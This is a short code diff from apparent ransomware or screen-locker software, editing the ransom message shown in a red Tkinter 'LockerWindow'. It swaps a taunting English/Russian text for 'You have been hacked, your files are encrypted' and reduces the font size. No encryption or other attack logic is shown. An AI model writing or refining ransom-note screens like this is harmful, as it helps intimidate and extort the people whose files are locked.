@@ -45,8 +45,8 @@ class LockerWindow:
 
         title = tk.Label(
             root,
-            text="You hacked team red crime. твои файлы были зашифрованы лошара",
-            font=("Arial", 48, "bold"),
+            text="You have been hacked, your files are encrypted",
+            font=("Arial", 42, "bold"),
             fg="black",
             bg="red"
         )
